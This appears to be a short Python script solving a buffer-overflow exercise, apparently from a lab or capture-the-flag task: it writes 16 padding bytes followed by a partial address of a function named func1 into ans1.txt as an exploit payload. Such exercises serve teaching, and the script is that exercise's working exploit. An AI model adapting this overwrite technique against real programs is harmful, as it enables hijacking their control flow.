padding = b"A" * 16
func1_address_low = b"\x16\x12\x40"  
payload = padding + func1_address_low

with open("ans1.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans1.txt")